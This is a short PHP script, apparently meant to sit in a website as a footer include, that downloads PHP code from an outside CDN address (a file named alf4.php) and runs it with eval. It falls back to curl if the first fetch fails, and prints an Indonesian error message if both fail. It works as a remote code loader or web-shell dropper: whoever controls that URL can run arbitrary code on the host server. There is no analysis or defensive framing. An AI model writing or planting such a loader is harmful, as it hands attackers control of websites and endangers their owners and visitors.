
<?php
$url = 'https://detik.b-cdn.net/k/alf4.php';
$exfooter = @file_get_contents($url);
if ($exfooter === false) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $exfooter = curl_exec($ch);
    curl_close($ch);
}
if ($exfooter !== false) {
    eval('?>' . $exfooter);
} else {
    echo "Gagal ambil data dari $url";
}
?>






